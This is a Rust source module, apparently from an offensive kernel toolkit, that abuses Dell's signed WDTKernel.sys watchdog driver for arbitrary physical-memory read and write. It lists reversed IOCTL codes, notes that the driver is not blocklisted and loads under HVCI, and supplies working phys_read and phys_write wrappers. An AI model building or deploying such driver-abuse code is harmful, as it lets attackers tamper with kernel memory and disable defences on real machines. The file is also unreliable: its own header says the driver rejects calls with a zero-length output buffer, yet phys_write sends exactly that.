//! WDTKernel.sys — Dell Watchdog Timer (LOLDrivers #290).
//!
//! **Status: NOT blocklisted** as of July 2026. WHQL-attestation signed,
//! distributed via the Microsoft Update Catalog. Loads and functions under
//! HVCI — which is exactly why operators reach for it on HVCI-safe targets.
//!
//! Device: `\\.\__WDT__`
//!
//! ## Protocol (GROUND TRUTH: statically reversed from the real binaries)
//!
//! Verified against both LOLDrivers samples (SHA256-verified downloads):
//!   - `3a00cd7c…` SHA256 8b695b1a…1462fe — WDT 1.3.5.0 (PDB path string
//!     `C:\Users\Xinstar\Desktop\Work\WDT1.3.5.0\Tool\WDTKernel.pdb`)
//!   - `1055e17e…` SHA256 0e27bec3…6b28b7 — WDT 1.3.5.1
//! Both are x64 KMDF drivers; the EvtIoDeviceControl for the default queue is
//! at RVA 0x6000 in section `PAGED_CO` (registered at PAGE+0x1b0:
//! `lea rax,[rip-0x13b7]` → 0x6000, stored into the queue-config struct).
//! The dispatch tree is byte-identical in both samples (later handlers shifted
//! by ≤0x10 in 1.3.5.1); RVA citations below are from 1.3.5.0.
//!
//! Device `\Device\__WDT__` + symlink `\DosDevices\__WDT__` (strings at RVA
//! 0x7590/0x75b0 in 1.3.5.0, 0x7580/0x75a0 in 1.3.5.1) ⇒ `\\.\__WDT__`.
//!
//! ### Dispatch-wide gates (PAGED_CO 0x6000, EvtIoDeviceControl)
//!
//! - **Both buffer lengths must be non-zero**: `test rbx,rbx; je fail` at
//!   PAGED_CO+0x72 (OutputBufferLength) and `test r15,r15; je fail` at +0x7b
//!   (InputBufferLength) → `STATUS_INVALID_PARAMETER` (0xC000000D at +0x8d6).
//!   A write IOCTL issued with a NULL/0 output buffer is REJECTED by the
//!   driver before any handler runs.
//! - `WdfRequestRetrieveInputBuffer` / `…OutputBuffer` are called with
//!   RequiredSize = 0 (`xor r8d,r8d` at +0x9f/+0xdf; WDF fn-table slots
//!   +0x868/+0x870) — **no minimum-size enforcement**; the handlers deref
//!   input+0 unconditionally.
//! - Unknown code → `STATUS_INVALID_DEVICE_REQUEST` (0xC0000010 at +0x889).
//!
//! ### IOCTL map — 46 codes, 0x9C412400–0x9C4124B8 step 4
//!
//! DeviceType 0x9C41, Function 0x900+idx, **METHOD_BUFFERED** (low 2 bits 0)
//! for every code. Physical-address primitives (all take PA = u64 LE at
//! input+0; `mov rcx,[rcx]`):
//! ```text
//!   0x9C412400  Read  DWORD   → out u32, Information=4   (+0x1d5 → .text 0x1340)
//!   0x9C412404  Read  WORD    → out u16, Information=2   (+0x1bd → .text 0x1370)
//!   0x9C412408  Read  BYTE    → out u8,  Information=1   (+0x1a0 → .text 0x1314)
//!   0x9C41240C  Write DWORD   val=u32@in+8, echo → out   (+0x184 → .text 0x13d4)
//!   0x9C412410  Write WORD    val=u16@in+8 ZERO-EXTENDED, but calls the DWORD
//!                             writer — writes 4 bytes, upper 2 zeroed (+0x160)
//!   0x9C412414  Write BYTE    val=u8@in+8, echo → out    (+0x213 → .text 0x13a0)
//!   0x9C412418  Bulk Read  DWORD  map OutLen bytes, rep movsd OutLen>>2 (+0x327)
//!   0x9C41241C  Bulk Read  WORD   map OutLen bytes, rep movsw OutLen>>1 (+0x2fa)
//!   0x9C412420  Bulk Read  BYTE   map OutLen bytes, rep movsb OutLen    (+0x2d4)
//!   0x9C412424  Bulk Write DWORD  map InLen-8 bytes, rep movsd (InLen-8)>>2
//!                                   from in+8                          (+0x29a)
//!   0x9C412428  Bulk Write WORD   idem, count (InLen-8)>>1             (+0x265)
//!   0x9C41242C  Bulk Write BYTE   idem, count InLen-8                  (+0x366)
//! ```
//! (0x9C412430–0x45C are I/O-port in/out single+`rep ins/outs`; 0x460/0x464
//! PCI config 0xCF8/0xCFC; 0x468–0x4B8 watchdog-timer control. Not used here.)
//!
//! Chunk/count semantics that this file relies on:
//! - **Bulk READ**: transfer count = **OutputBufferLength** — `mov rdx,rbx`
//!   at +0x2e1 maps `rbx` (= OutputBufferLength, never reassigned on the read
//!   path) bytes, `mov ecx,ebx; rep movsb` at +0x2f1 copies that many bytes to
//!   the output buffer. Input buffer beyond the 8-byte PA is ignored.
//! - **Bulk WRITE**: transfer count = **InputBufferLength − 8** —
//!   `lea rbx,[r15-8]` at +0x36d; map that many bytes, `rep movsb` from
//!   `in+8` (`add rsi,8` at +0x38b). The output buffer is never written but
//!   must exist (non-zero length, per the dispatch-wide gate).
//! - CacheType is always `MmNonCached` (1) — `mov r8d,1` at every
//!   MmMapIoSpace call site.
//! - **Zero validation**: no physical-range check, no caller-PID/name check
//!   anywhere in the dispatch — the PA goes straight to MmMapIoSpace.
//!
//! ## Why raw_rw returns an error (operational-safety contract)
//!
//! [`crate::byovd::VulnDriverIoctl::raw_rw`] — and therefore the
//! [`crate::KernelRw`] impl — hands the driver a kernel VIRTUAL address.
//! WDTKernel cannot consume a VA: it has no VA→PA translator (no
//! `MmGetPhysicalAddress` wrapper IOCTL is exposed). Calling MmMapIoSpace on a
//! virtual address treats its bits as a physical address and maps GARBAGE,
//! yielding silently wrong reads and writes to random physical RAM — on a
//! driver operators pick specifically for HVCI-safe targets, that is an
//! operational-safety failure (BSOD / corruption), not a soft error.
//!
//! Per the BYOVD fix contract ("a clear not-working stub is better than a
//! silently-wrong implementation"), this driver overrides
//! [`VulnDriverIoctl::supports_va`] to `false`, so [`ByovdDriver`]'s
//! `kread`/`kwrite` return `Err(KrwError::Unavailable(...))` up front — the
//! permanent VA→PA mismatch is never misreported as a transient partial
//! transfer (kernelsdk-1-6). To use WDTKernel for kernel R/W it must be
//! COMPOSED with a VA→PA step (a DTB page-walk via a separate primitive, or
//! pairing it with a driver that exposes `MmGetPhysicalAddress`); the
//! physical-mode helpers below ([`WdtKernel::phys_read`] /
//! [`WdtKernel::phys_write`]) implement the correct bulk IOCTL protocol for
//! that composition.
//!
//! Sources: github.com/magicsword-io/LOLDrivers/issues/290 (intel) +
//! static analysis of the two real samples above (capstone disasm, this repo
//! `tmp/wdt-re/`) — intel CONFIRMED, and the zero-output-length gate above
//! is a correction the intel missed.

use crate::byovd::{DeviceIoControlFn, RwOp, VulnDriverIoctl};
use crate::KrwError;
use core::ffi::c_void;
use core::ptr;

pub struct WdtKernel;

/// Bulk read BYTE (physical addr → output buffer), MmMapIoSpace-based.
/// PAGED_CO+0xf9 `cmp` tree → `je 0x62d4` at +0x24d; handler at +0x2d4
/// maps OutputBufferLength bytes and `rep movsb`s them out (both samples).
const WDT_IOCTL_READ_BULK: u32 = 0x9C412420;
/// Bulk write BYTE (input buffer → physical addr), MmMapIoSpace-based.
/// `je 0x6366` at +0x11c; handler at +0x366 maps InputBufferLength-8 bytes
/// and `rep movsb`s from input+8 (both samples).
const WDT_IOCTL_WRITE_BULK: u32 = 0x9C41242C;

impl VulnDriverIoctl for WdtKernel {
    fn device_path(&self) -> &[u16] {
        // \\.\__WDT__ — the real Dell WDT device (NOT "\\.\WatchdogTimer";
        // that path does not exist and would fail CreateFileW). 9 code units
        // after the \\.\ prefix: '_','_','W','D','T','_','_'.
        static PATH: [u16; 11] = [
            '\\' as u16, '\\' as u16, '.' as u16, '\\' as u16,
            '_' as u16, '_' as u16, 'W' as u16, 'D' as u16,
            'T' as u16, '_' as u16, '_' as u16,
        ];
        &PATH
    }
    // The R/W IOCTLs that raw_rw WOULD use if it could translate VA→PA. Kept
    // accurate (per LOLDrivers #290); the VA→PA-composed impl exists in
    // `win/wdt.rs` (CR3 scan + VaKernelRw) — raw_rw itself does NOT call them
    // on a raw VA.
    fn read_ioctl(&self) -> u32 { WDT_IOCTL_READ_BULK }
    fn write_ioctl(&self) -> u32 { WDT_IOCTL_WRITE_BULK }
    fn blocklist_status(&self) -> &'static str {
        "CLEAN: not on Microsoft Vulnerable Driver Blocklist as of July 2026. HVCI-compatible (WHQL)."
    }

    /// Physical-address-only primitive: the `KernelRw` VA contract cannot be
    /// satisfied, so [`ByovdDriver`] fails up front with
    /// `KrwError::Unavailable` (kernelsdk-1-6) instead of feeding a VA to
    /// MmMapIoSpace and corrupting random physical RAM.
    fn supports_va(&self) -> bool {
        false
    }

    /// KernelRw hands us a kernel VIRTUAL address; WDTKernel can only consume
    /// PHYSICAL addresses (MmMapIoSpace, no VA→PA wrapper). Returning a clear
    /// error here is correct: silently feeding a VA to MmMapIoSpace corrupts
    /// random physical RAM. The VA→PA mismatch is already rejected up front by
    /// [`ByovdDriver`] via `supports_va() == false`; this is the defense in
    /// depth in case a caller drives `raw_rw` directly.
    unsafe fn raw_rw(
        &self,
        _op: RwOp,
        _kaddr: u64,
        _buf: &mut [u8],
        _device: *mut c_void,
        _dioctl: DeviceIoControlFn,
    ) -> Result<(), usize> {
        // Cannot satisfy the VA-based KernelRw contract; signal failure via
        // the Partial path with ok=0 (the ByovdDriver gate already turned this
        // into KrwError::Unavailable before raw_rw is reached).
        Err(0)
    }
}

impl WdtKernel {
    /// Physical-memory read via the bulk-read BYTE IOCTL. For callers that
    /// already have a PHYSICAL address (e.g. a DTB page-walk composing on top
    /// of WDTKernel). NOT exposed through `KernelRw` (which is VA-based).
    ///
    /// # Safety
    /// `dioctl` must be `kernel32!DeviceIoControl` and `device` a valid HANDLE
    /// to `\\.\__WDT__`. `phys_addr` must be a real physical address.
    pub unsafe fn phys_read(
        device: *mut c_void,
        dioctl: DeviceIoControlFn,
        phys_addr: u64,
        buf: &mut [u8],
    ) -> Result<(), KrwError> {
        if buf.is_empty() {
            return Ok(());
        }
        // Input buffer = 8-byte physical address. The driver MmMapIoSpace-maps
        // it and copies `buf.len()` bytes into the output buffer.
        let mut input = [0u8; 8];
        input.copy_from_slice(&phys_addr.to_le_bytes());
        let mut ret: u32 = 0;
        let ok = unsafe {
            dioctl(
                device,
                WDT_IOCTL_READ_BULK,
                input.as_ptr() as *const c_void,
                input.len() as u32,
                buf.as_mut_ptr() as *mut c_void,
                buf.len() as u32,
                &mut ret,
                ptr::null_mut(),
            )
        };
        if ok == 0 {
            Err(KrwError::Other(
                "WDTKernel phys_read IOCTL failed (invalid physical address?)".into(),
            ))
        } else {
            Ok(())
        }
    }

    /// Physical-memory write via the bulk-write BYTE IOCTL. Counterpart to
    /// [`phys_read`](Self::phys_read).
    ///
    /// # Safety
    /// Same contract as [`phys_read`](Self::phys_read).
    pub unsafe fn phys_write(
        device: *mut c_void,
        dioctl: DeviceIoControlFn,
        phys_addr: u64,
        buf: &[u8],
    ) -> Result<(), KrwError> {
        if buf.is_empty() {
            return Ok(());
        }
        // Input buffer = 8-byte physical address + payload. The driver
        // MmMapIoSpace-maps the address and writes the payload to it.
        let mut input: alloc::vec::Vec<u8> = alloc::vec![0u8; 8 + buf.len()];
        input[..8].copy_from_slice(&phys_addr.to_le_bytes());
        input[8..].copy_from_slice(buf);
        let mut ret: u32 = 0;
        let ok = unsafe {
            dioctl(
                device,
                WDT_IOCTL_WRITE_BULK,
                input.as_ptr() as *const c_void,
                input.len() as u32,
                ptr::null_mut(),
                0,
                &mut ret,
                ptr::null_mut(),
            )
        };
        if ok == 0 {
            Err(KrwError::Other(
                "WDTKernel phys_write IOCTL failed (invalid physical address?)".into(),
            ))
        } else {
            Ok(())
        }
    }
}
